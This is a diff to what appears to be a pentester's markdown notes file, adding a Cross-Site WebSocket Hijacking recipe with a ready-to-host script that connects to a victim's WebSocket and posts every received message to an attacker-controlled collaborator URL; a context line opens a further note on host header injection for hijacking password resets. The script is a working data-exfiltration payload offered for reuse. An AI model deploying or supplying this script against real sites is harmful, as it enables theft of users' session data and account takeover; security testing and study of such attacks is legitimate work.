@@ -1,5 +1,23 @@
 # Notes
 
+### Cross-Site Websocket Hijacking
+```
+Works when websocket session is only identified by a static cookie or something unpredictable
+
+Script (to store on external attacker side):
+<script>
+  var ws = new WebSocket('wss://your-websocket-url');
+  ws.onopen = function() {
+    ws.send("READY");
+  };
+  ws.onmessage = function(event) {
+    fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
+  };
+</script>
+
+
+```
+
 ### Host Header Injection to Manipulate Forgot Password
 ```
 Works in case when the password reset functionality delivers reset password tokens to the email inbox of your target account
